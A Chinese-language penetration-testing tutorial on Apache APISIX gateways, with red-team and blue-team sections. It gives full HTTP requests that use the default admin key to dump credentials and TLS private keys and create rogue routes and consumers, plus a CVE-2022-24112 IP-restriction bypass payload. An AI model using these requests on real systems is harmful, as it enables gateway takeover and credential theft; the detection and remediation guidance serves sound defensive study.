---
title: "Apache APISIX API网关管理面打点与Admin API利用技术"
date: 2026-06-16T11:09:50+08:00
draft: false
weight: 70
description: "围绕Apache APISIX API网关相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "API网关", "APISIX", "Admin API"]
---

# Apache APISIX API网关管理面打点与Admin API利用技术

`Apache APISIX` 是典型的云原生 API 网关控制平面。它的价值不只是“一个 Nginx/OpenResty 网关”，而在于它同时汇聚了：

- Route、Service、Upstream、Consumer、Plugin Config 等核心对象
- 内置 Dashboard、Admin API、Status API 与 Control API
- 多协议网关入口、TLS/SNI、mTLS 与证书配置
- 基于 etcd 的实时配置同步与 watch 机制
- 身份认证、限流、改写、日志、可观测性与 serverless 类插件

对攻击者来说，APISIX 一旦管理面暴露到低信任网络，通常能一次性回收：

- 对外 API 域名、路径、方法与路由匹配条件
- 内部上游节点地址、端口、权重、健康检查与服务发现方式
- 已启用的认证、限流、日志和改写插件
- Consumer、Credential、Key/JWT/Basic/HMAC 边界
- 证书、SNI、mTLS 与上游 TLS 访问关系
- etcd 驱动的集中式配置结构

更关键的是，APISIX 的 `Admin API` 不是“查看面板”，而是配置下发面。只要拿到有效 `X-API-KEY`，攻击者就可以继续转向：

- 新建或改写 Route / Service / Upstream
- 植入高风险插件、脚本或 serverless 逻辑
- 创建 Consumer 与凭据，伪造合法调用方
- 改写证书与 SNI，改变 TLS 终止行为
- 通过默认 token、IP 限制绕过或错误暴露，直接接管整个网关配置

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 APISIX 管理面
2. 如何围绕 `Admin API`、`Dashboard`、`etcd` 建立配置画像
3. 如何从 Route、Service、Upstream、Consumer、Plugin Config 判断真实风险
4. 哪些请求与响应最值得完整留档
5. 蓝队如何从访问日志、日志插件、指标和 etcd 变更痕迹识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

APISIX 首轮至少应枚举：

- `9080/tcp`
- `9443/tcp`
- `9180/tcp`
- `/apisix/admin/routes`
- `/apisix/admin/services`
- `/apisix/admin/upstreams`
- `/apisix/admin/consumers`
- `/apisix/admin/plugin_configs`
- `/apisix/admin/ssls`
- `/apisix/admin/global_rules`
- `/apisix/admin/schema/validate/routes`
- `/apisix/admin/plugins/list`
- `/apisix/admin/stream_routes`
- `/ui/`
- `/apisix/prometheus/metrics`

如果部署暴露了其它 API，还应关注：

- `/v1/schema`
- `/v1/routes`
- `/v1/services`
- `/status`

### 0.2 官方默认边界

官方文档与 FAQ 中，最关键的默认边界包括：

- `Admin API` 默认监听 `9180`
- `Admin API` 默认前缀为 `/apisix/admin`
- 使用 `X-API-KEY` 头认证
- 默认仅允许 `127.0.0.0/24` 访问管理面
- 内置 Dashboard 默认启用
- 历史版本和文档示例中长期存在公开已知的默认 `admin_key`

这意味着实战中需要明确区分：

1. 仅代理面开放
2. `9180` 管理面误暴露
3. `Dashboard` 暴露且可直接连 `Admin API`
4. `Admin API` 仍在使用默认 key

### 0.3 etcd 的实战意义

APISIX 与很多网关不同，它把配置中心直接建立在 `etcd` 上。官方 FAQ 明确指出 APISIX 依赖 etcd 的 watch / 事件通知能力同步配置。对打点来说，这意味着：

- 控制面配置通常高度集中
- 攻击者只要拿到 `Admin API`，就能影响全局配置
- 若进一步打到 etcd，可能直接观察或篡改更底层配置路径

### 0.4 打点收益优先级

按“最快转成真实攻击价值”的顺序，APISIX 的打点收益通常可排为：

1. 确认是否为 APISIX，识别 `Admin API`、Dashboard 与默认路径
2. 测试 `X-API-KEY` 边界，尤其是默认 token 与错误放开的管理面
3. 枚举 Route、Service、Upstream、Plugin、Consumer、SSL 对象
4. 判断是否存在可直接读凭据、证书、上游节点与日志外发配置
5. 判断是否满足历史默认 token、IP 限制绕过或插件链放大条件

---

## 1. 第一轮打点：确认是否为 APISIX

### 1.1 `GET /apisix/admin/routes`

官方文档明确指出 `Admin API` 默认监听 `9180`，路径前缀是 `/apisix/admin`。因此 `routes` 列表是首轮识别最直接的入口。

#### 请求示例

```http
GET /apisix/admin/routes HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "list": [
    {
      "key": "/apisix/routes/1",
      "value": {
        "id": "1",
        "uri": "/billing/*",
        "status": 1,
        "upstream_id": "1",
        "create_time": 1781608201,
        "update_time": 1781609208
      }
    }
  ],
  "total": 1
}
```

#### 典型失败响应示例

```json
{
  "error_msg": "failed to check token"
}
```

这一步能同时确认：

- 目标是 APISIX 管理面
- `X-API-KEY` 是否有效
- 响应格式是否来自 etcd-backed 对象列表

### 1.2 `GET /ui/` 识别 Dashboard

官方 Dashboard 文档说明：

- 内置 Dashboard 默认启用
- 访问路径可为 `http://127.0.0.1:9180/ui/`
- Dashboard 直接依赖 Admin API Key

#### 请求示例

```http
GET /ui/ HTTP/1.1
Host: apisix-admin.target.example:9180
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html
Server: APISIX/3.14.0
```

```html
<!doctype html>
<html>
  <head>
    <title>Apache APISIX Dashboard</title>
  </head>
</html>
```

页面或前端资源中常见特征包括：

- `Apache APISIX Dashboard`
- `failed to check token`
- `routes`
- `upstreams`
- `plugin_configs`

### 1.3 `GET /apisix/admin/plugins/list`

#### 请求示例

```http
GET /apisix/admin/plugins/list HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    "key-auth",
    "jwt-auth",
    "basic-auth",
    "openid-connect",
    "batch-requests",
    "serverless-pre-function",
    "serverless-post-function",
    "http-logger",
    "prometheus"
  ]
}
```

这一条接口非常适合首轮判断：

- 当前网关启用了哪些插件
- 是否存在高风险插件
- 是否满足某些历史漏洞前提

### 1.4 APISIX 典型响应头与错误模式

在首轮请求中经常可以看到：

- `Server: APISIX/x.y.z`
- `Server: openresty`
- `Access-Control-Allow-Origin: *`
- `failed to check token`
- `missing apikey`

这类错误模式同样值得记录，因为它们能帮助区分：

- APISIX 本身
- 一个被反向代理后的管理面
- 一个前端 Dashboard 与后端 Admin API 分离的场景

---

## 2. 第二轮打点：默认 token、Dashboard 与认证边界

### 2.1 历史默认 `admin_key`

官方 Dashboard 文档和 FAQ 长期都给出过公开已知的默认 `admin_key`：

- `edd1c9f034335f136f87ad84b625c8f1`

这不是“随机示例”，而是实战里极常见的误配置源头。很多外部暴露实例在部署后没有及时改掉它。

#### 请求示例

```http
GET /apisix/admin/services HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "list": [
    {
      "key": "/apisix/services/1",
      "value": {
        "id": "1",
        "name": "billing-service",
        "plugins": {
          "key-auth": {}
        }
      }
    }
  ],
  "total": 1
}
```

如果这一条直接成功，风险基本已不再是“识别阶段”，而是：

- 默认管理凭据接管
- 全局网关配置可读
- 后续大量对象可被导出或改写

### 2.2 Dashboard 的 token 输入链

官方 Dashboard 文档说明：

- `Dashboard` 通过 `Admin API Key` 与 `Admin API` 交互
- 如果 key 错误，界面会提示 `failed to check token`

#### 请求示例

```http
POST /apisix/admin/routes HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: wrong-token
Content-Type: application/json
Connection: close

{
  "id": "1001",
  "uri": "/check",
  "upstream": {
    "type": "roundrobin",
    "nodes": {
      "127.0.0.1:1980": 1
    }
  }
}
```

#### 典型响应示例

```json
{
  "error_msg": "failed to check token"
}
```

这意味着对蓝队来说，`failed to check token` 的集中出现本身就是管理面撞 token 的明显信号。

### 2.3 `allow_admin` 的边界

官方文档明确建议通过 `deployment.admin.allow_admin` 限制管理面访问 IP，并将默认值保持在 `127.0.0.0/24`。因此实战中要明确区分：

- 管理端口暴露但仍只有本地能访问
- 管理端口被绑定到外部地址且放宽了 `allow_admin`
- 有外部访问控制，但仍可能被漏洞绕过

#### 配置片段示例

```yaml
deployment:
  admin:
    allow_admin:
      - 127.0.0.0/24
    admin_listen:
      ip: 0.0.0.0
      port: 9180
```

如果出现：

- `admin_listen.ip: 0.0.0.0`
- `allow_admin` 已放开到广域地址

则误暴露概率极高。

### 2.4 `schema/validate` 的试探价值

APISIX `Admin API` 支持直接对对象做 schema 校验。这种接口不一定能扩大权限，但很适合判断管理面是否真实可写。

#### 请求示例

```http
POST /apisix/admin/schema/validate/routes HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Connection: close

{
  "uri": 1980,
  "upstream": {
    "scheme": "https",
    "type": "roundrobin",
    "nodes": {
      "nghttp2.org": 1
    }
  }
}
```

#### 典型响应示例

```json
{
  "error_msg": "property \"uri\" validation failed: wrong type: expected string, got number"
}
```

这类返回说明：

- 当前确实到达了 APISIX 对象校验逻辑
- 并非简单反代假接口
- 后续可以更高置信度进入写操作边界判断

---

## 3. 第三轮打点：Routes、Services、Upstreams 与网关拓扑

### 3.1 `GET /apisix/admin/routes`

#### 请求示例

```http
GET /apisix/admin/routes HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/routes/1",
      "value": {
        "id": "1",
        "uri": "/billing/*",
        "methods": [
          "GET",
          "POST"
        ],
        "host": "api.target.example",
        "service_id": "1",
        "plugins": {
          "limit-count": {
            "count": 1000,
            "time_window": 60,
            "rejected_code": 429
          }
        },
        "status": 1
      }
    }
  ],
  "total": 1
}
```

Route 列表通常能直接还原：

- 对外路径
- 域名
- 方法限制
- 插件挂载位置
- 与 Service 的关系

### 3.2 `GET /apisix/admin/services`

#### 请求示例

```http
GET /apisix/admin/services HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/services/1",
      "value": {
        "id": "1",
        "name": "billing-service",
        "upstream_id": "1",
        "plugins": {
          "key-auth": {},
          "proxy-rewrite": {
            "regex_uri": [
              "^/billing/(.*)",
              "/$1"
            ]
          }
        }
      }
    }
  ],
  "total": 1
}
```

Service 对象有很高的复用价值，因为它通常聚合了：

- Route 共享的上游
- 共用插件
- 重写逻辑

### 3.3 `GET /apisix/admin/upstreams`

#### 请求示例

```http
GET /apisix/admin/upstreams HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/upstreams/1",
      "value": {
        "id": "1",
        "type": "roundrobin",
        "nodes": {
          "10.20.41.31:8080": 1,
          "10.20.41.32:8080": 1
        },
        "scheme": "http",
        "timeout": {
          "connect": 6,
          "send": 6,
          "read": 6
        },
        "checks": {
          "active": {
            "http_path": "/healthz"
          }
        }
      }
    }
  ],
  "total": 1
}
```

这一层的攻击价值极高，因为它会直接暴露：

- 真实上游 IP
- 健康检查路径
- 负载均衡方式
- 与业务组件的真实基础设施关系

### 3.4 `GET /apisix/admin/routes?filter=service_id=1`

官方文档明确说明 APISIX 支持按 `service_id` 和 `upstream_id` 过滤 route。

#### 请求示例

```http
GET /apisix/admin/routes?filter=service_id=1 HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/routes/1",
      "value": {
        "id": "1",
        "service_id": "1",
        "uri": "/billing/*"
      }
    },
    {
      "key": "/apisix/routes/7",
      "value": {
        "id": "7",
        "service_id": "1",
        "uri": "/billing-internal/*"
      }
    }
  ],
  "total": 2
}
```

这对于恢复“同一个 service 对外暴露了哪些入口”特别高效。

### 3.5 Stream Route

如果环境同时使用 TCP/TLS 代理，还应检查 `stream_routes`。

#### 请求示例

```http
GET /apisix/admin/stream_routes HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/stream_routes/1",
      "value": {
        "id": "1",
        "server_addr": "0.0.0.0",
        "server_port": 9100,
        "upstream_id": "17"
      }
    }
  ],
  "total": 1
}
```

这一步的实战意义在于：

- APISIX 不只代理 HTTP
- 还有可能统一暴露 TCP/TLS 入口

---

## 4. 第四轮打点：Consumers、Credentials、Plugin Config 与 SSL

### 4.1 `GET /apisix/admin/consumers`

#### 请求示例

```http
GET /apisix/admin/consumers HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/consumers/mobile-app",
      "value": {
        "username": "mobile-app",
        "plugins": {
          "limit-count": {
            "count": 5000,
            "time_window": 60
          }
        }
      }
    }
  ],
  "total": 1
}
```

Consumer 列表适合回收：

- 调用方身份命名
- 每个调用方的限流和个性化策略
- 哪些消费者看起来是内部应用或合作方

### 4.2 `GET /apisix/admin/consumers/{consumer}/credentials`

官方术语文档说明 Credential 用于承载 `basic-auth`、`hmac-auth`、`jwt-auth`、`key-auth` 等认证配置。

#### 请求示例

```http
GET /apisix/admin/consumers/mobile-app/credentials HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/consumers/mobile-app/credentials/key-auth-one",
      "value": {
        "id": "key-auth-one",
        "plugins": {
          "key-auth": {
            "key": "mbl-prod-4f9fd8b8f7a74a3e"
          }
        }
      }
    }
  ],
  "total": 1
}
```

如果这里能直接读到 credential，风险会快速扩大为：

- 获取合法 API 调用凭据
- 模拟真实客户端身份

### 4.3 `GET /apisix/admin/plugin_configs`

#### 请求示例

```http
GET /apisix/admin/plugin_configs HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/plugin_configs/1",
      "value": {
        "id": "1",
        "plugins": {
          "openid-connect": {
            "client_id": "gateway-prod",
            "discovery": "https://sso.target.example/realms/prod/.well-known/openid-configuration",
            "bearer_only": false
          },
          "http-logger": {
            "uri": "https://log.target.example/apisix",
            "batch_max_size": 1000
          }
        }
      }
    }
  ],
  "total": 1
}
```

这一层常常会暴露：

- OIDC 认证服务地址
- 远端日志汇聚地址
- 外发式 observability 目的地
- 某些插件的高风险配置细节

### 4.4 `GET /apisix/admin/ssls`

官方文档明确指出 SSL 对象请求地址是 `/apisix/admin/ssls/{id}`，响应当前直接来自 etcd。

#### 请求示例

```http
GET /apisix/admin/ssls HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/ssl/1",
      "value": {
        "id": "1",
        "snis": [
          "api.target.example"
        ],
        "cert": "-----BEGIN CERTIFICATE-----\nMIIDBjCCAe4CCQC0...\n-----END CERTIFICATE-----",
        "key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkq...\n-----END PRIVATE KEY-----"
      }
    }
  ],
  "total": 1
}
```

如果这里可读到私钥，风险等级已经非常高，因为这意味着：

- TLS 终止链泄露
- 网关证书私钥泄露

### 4.5 `GET /apisix/admin/global_rules`

#### 请求示例

```http
GET /apisix/admin/global_rules HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/global_rules/1",
      "value": {
        "id": "1",
        "plugins": {
          "prometheus": {},
          "cors": {}
        }
      }
    }
  ],
  "total": 1
}
```

`global_rules` 对象往往决定了：

- 全局插件
- 全局指标和日志
- 某些统一跨域或安全控制

---

## 5. 第五轮打点：写操作与历史利用链

### 5.1 创建 Route 与 Upstream

拿到 `Admin API` 有效 key 后，最值得先验证的是是否可直接创建 Route/Upstream。

#### 请求示例

```http
PUT /apisix/admin/upstreams/9001 HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Connection: close

{
  "type": "roundrobin",
  "nodes": {
    "10.20.99.50:8080": 1
  }
}
```

#### 典型响应示例

```json
{
  "key": "/apisix/upstreams/9001",
  "value": {
    "id": "9001",
    "type": "roundrobin",
    "nodes": {
      "10.20.99.50:8080": 1
    }
  }
}
```

#### 请求示例

```http
PUT /apisix/admin/routes/9001 HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Connection: close

{
  "uri": "/debug-apisix/*",
  "upstream_id": "9001",
  "plugins": {
    "proxy-rewrite": {
      "regex_uri": [
        "^/debug-apisix/(.*)",
        "/$1"
      ]
    }
  }
}
```

#### 典型响应示例

```json
{
  "key": "/apisix/routes/9001",
  "value": {
    "id": "9001",
    "uri": "/debug-apisix/*",
    "upstream_id": "9001",
    "status": 1
  }
}
```

一旦这些写操作成功，攻击面已经从“打点”升级为：

- 暴露内部服务
- 流量导向控制
- 网关层路径改写

### 5.2 创建带认证凭据的 Consumer

#### 请求示例

```http
PUT /apisix/admin/consumers/redteam-bot HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Connection: close

{
  "username": "redteam-bot"
}
```

#### 典型响应示例

```json
{
  "key": "/apisix/consumers/redteam-bot",
  "value": {
    "username": "redteam-bot"
  }
}
```

#### 请求示例

```http
PUT /apisix/admin/consumers/redteam-bot/credentials/key-auth-one HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Connection: close

{
  "plugins": {
    "key-auth": {
      "key": "redteam-debug-key"
    }
  }
}
```

#### 典型响应示例

```json
{
  "key": "/apisix/consumers/redteam-bot/credentials/key-auth-one",
  "value": {
    "id": "key-auth-one",
    "plugins": {
      "key-auth": {
        "key": "redteam-debug-key"
      }
    }
  }
}
```

这类写操作一旦可用，说明攻击者可以：

- 创建合法调用方身份
- 绕过下游对来源方的信任假设

### 5.3 历史风险：`CVE-2020-13945` 默认 token

APISIX 最经典的历史风险之一，就是管理面使用公开已知默认 token。其核心意义不是“存在一个复杂漏洞”，而是：

- Admin API 访问令牌公开已知
- 管理端口一旦暴露
- 攻击者即可直接接管整个网关配置

#### 请求示例

```http
GET /apisix/admin/routes HTTP/1.1
Host: apisix-admin.target.example:9180
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Connection: close
```

#### 典型响应示例

```json
{
  "list": [
    {
      "key": "/apisix/routes/1",
      "value": {
        "id": "1",
        "uri": "/billing/*"
      }
    }
  ],
  "total": 1
}
```

这条链的实战价值在于：

- 不需要额外漏洞链
- 配合管理端口暴露即可形成直接接管

### 5.4 历史风险：`CVE-2022-24112` `batch-requests` 绕过 IP 限制

官方安全公告明确指出：

- `batch-requests` 插件可被滥用
- 可绕过 `Admin API` 的 IP 限制
- 默认配置且默认 key 未改时，可能进一步达到远程代码执行级别影响

#### 请求示例

```http
POST /apisix/batch-requests HTTP/1.1
Host: api.target.example:9080
Content-Type: application/json
Connection: close

{
  "headers": {
    "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
    "X-REAL-IP": "127.0.0.1"
  },
  "pipeline": [
    {
      "method": "GET",
      "path": "/apisix/admin/routes"
    }
  ]
}
```

#### 典型响应示例

```json
[
  {
    "status": 200,
    "reason": "OK",
    "body": "{\"list\":[{\"key\":\"/apisix/routes/1\",\"value\":{\"id\":\"1\",\"uri\":\"/billing/*\"}}],\"total\":1}"
  }
]
```

这条链的实战意义非常高，因为它告诉我们：

- 即使管理员以为 `allow_admin` 已限制到本地
- 网关插件链仍可能成为旁路
- 配合默认 key 时，管理面保护会被完全击穿

### 5.5 默认 key + 写操作 = 全局配置接管

由于 APISIX 动态配置与 etcd 同步机制的特点，只要管理面 key 有效，攻击者的改动会快速传播到运行时。实战中最危险的组合就是：

- `9180` 暴露
- 默认 `admin_key` 未改
- `allow_admin` 被放宽或被绕过
- 启用了 `batch-requests`、serverless、rewrite 等高影响插件

在这种组合下，攻击者几乎可以把 APISIX 当作：

- API 流量导流器
- 鉴权旁路器
- 内部服务暴露器
- 插件级逻辑执行平台

---

## 6. 蓝队日志、监控与处置

### 6.1 Admin API 访问日志

蓝队首先应盯住对以下路径的访问：

- `/apisix/admin/routes`
- `/apisix/admin/services`
- `/apisix/admin/upstreams`
- `/apisix/admin/consumers`
- `/apisix/admin/plugin_configs`
- `/apisix/admin/ssls`
- `/apisix/admin/global_rules`
- `/apisix/admin/schema/validate/routes`
- `/apisix/admin/plugins/list`
- `/ui/`

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:23:16:03 +0800] "GET /apisix/admin/routes HTTP/1.1" 200 1821 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:23:16:06 +0800] "GET /apisix/admin/upstreams HTTP/1.1" 200 934 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:23:16:12 +0800] "PUT /apisix/admin/routes/9001 HTTP/1.1" 200 421 "-" "python-requests/2.32.3"
```

如果同一来源连续完成：

- `routes`
- `services`
- `upstreams`
- `consumers`
- `plugin_configs`
- `ssls`

则基本可判定为结构化 APISIX 管理面打点。

### 6.2 Dashboard 与 token 错误日志

Dashboard 文档里明确存在 `failed to check token` 这一错误提示。实际排查中应重点识别：

- 短时间反复出现 token 校验失败
- 外部来源打开 `/ui/`
- Dashboard 页面资源正常但后台认证连续失败

#### 日志示例

```text
2026-06-16T23:15:41+08:00 [warn] failed to check token, client=203.0.113.25, path=/apisix/admin/routes
```

### 6.3 可观测性与日志插件

官方观察文档说明 APISIX 提供多种 logger 与 metrics 能力，例如：

- `http-logger`
- `kafka-logger`
- `rocketmq-logger`
- `file-logger`
- `prometheus`

对蓝队来说，这意味着：

- 管理面被打点时，可能不仅存在访问日志
- 还可能在远程日志平台、Kafka、Elasticsearch 等外部系统留痕

#### 指标示例

```text
apisix_etcd_modify_indexes{key="routes"} 20028
apisix_etcd_modify_indexes{key="services"} 19993
apisix_etcd_modify_indexes{key="consumers"} 17819
```

这类指标一旦在异常时段出现突变，往往意味着：

- 对象被新增或更新
- 配置中心正在被高频操作

### 6.4 etcd 侧排查

由于 APISIX 配置最终落在 etcd 中，蓝队排查时不应只看网关日志，还要重点检查：

- `/apisix/routes/*`
- `/apisix/services/*`
- `/apisix/upstreams/*`
- `/apisix/consumers/*`
- `/apisix/plugin_configs/*`
- `/apisix/ssl/*`

如果 etcd 自身也暴露审计、watch、快照或请求日志，应同步回溯：

- 是否出现异常 key 创建
- 是否短时间内大量读取配置树

### 6.5 处置建议

发现 APISIX 管理面被打点或已失守后，应优先做：

1. 立即收敛 `9180` 暴露面，只允许受控管理网段访问
2. 立即更换 `admin_key`，确认不再使用默认值
3. 检查 `allow_admin` 是否被放宽，检查 Dashboard 是否默认开启
4. 审查 `batch-requests`、`serverless-*`、`proxy-rewrite`、`openid-connect` 等高影响插件
5. 审查近期 `routes`、`services`、`upstreams`、`consumers`、`plugin_configs`、`ssls` 变更
6. 联动 etcd 检查是否存在异常 key 读取和写入

长期建议：

- 管理面不直接暴露公网
- 删除默认 token，改用高强度随机 key
- 不在生产环境开启不必要的 Dashboard
- 对 `batch-requests` 等高风险插件建立启用审批和检测
- 对 `9180`、`/ui/`、`/apisix/admin/*` 建立独立告警

---

## 7. 复盘清单

### 7.1 红队侧

- 是否确认了 `9180`、`/apisix/admin/*`、`/ui/` 的真实暴露边界
- 是否验证了默认 `admin_key` 与当前 token 校验反馈
- 是否完整记录了 `routes/services/upstreams/consumers/plugin_configs/ssls` 请求与响应
- 是否判断了是否存在 `batch-requests`、`serverless-*`、`openid-connect` 等高风险插件
- 是否评估了默认 token、IP 限制绕过与 etcd 配置中心的联动风险

### 7.2 蓝队侧

- 是否能识别从 `routes -> services -> upstreams -> consumers -> plugin_configs` 的连续访问链
- 是否能识别 `failed to check token` 和对 `/ui/` 的异常访问
- 是否能识别 `routes`、`upstreams`、`consumers`、`ssls` 的新增或改写
- 是否能联动 etcd 与远程日志插件排查配置变更痕迹

### 7.3 应急侧

- 是否确认是否已有默认 token 被利用
- 是否确认是否已有 route、credential、plugin 或 ssl 被植入或篡改
- 是否完成了 `9180`、Dashboard、默认 key、`allow_admin` 的收敛
- 是否完成 etcd 与高风险插件的基线复核

---

## 8. 总结

`Apache APISIX` 的真正风险，不只是“一个 API 网关后台能不能访问”，而在于它把：

- Route / Service / Upstream
- Consumer / Credential
- Plugin / Plugin Config
- SSL / SNI / mTLS
- Dashboard / Admin API
- etcd 配置中心

统一汇聚到同一套控制平面里。

对打点来说，更值得沉淀的方法学是：

- 先确认 `9180` 管理面、Dashboard 和默认 token 边界
- 再建立 `routes/services/upstreams/consumers/plugin_configs/ssls` 画像
- 再判断插件、凭据、证书和 etcd 的联动风险
- 最后把默认 token、IP 限制绕过与写操作接管链串起来

只有把这些对象连成链，才能把“APISIX 管理面暴露”真正转化为结构化攻击价值判断。

---

## 参考资料

- [Apache APISIX Admin API](https://apisix.apache.org/docs/apisix/admin-api/)
- [Apache APISIX Dashboard](https://apisix.apache.org/docs/apisix/dashboard/)
- [Apache APISIX FAQ](https://apisix.apache.org/docs/apisix/FAQ/)
- [Apache APISIX Deployment modes](https://apisix.apache.org/docs/apisix/deployment-modes/)
- [Apache APISIX Credential](https://apisix.apache.org/docs/apisix/terminology/credential/)
- [Observe APIs](https://apisix.apache.org/docs/apisix/tutorials/observe-your-api/)
- [CVE-2022-24112 Advisory](https://www.openwall.com/lists/oss-security/2022/02/11/3)
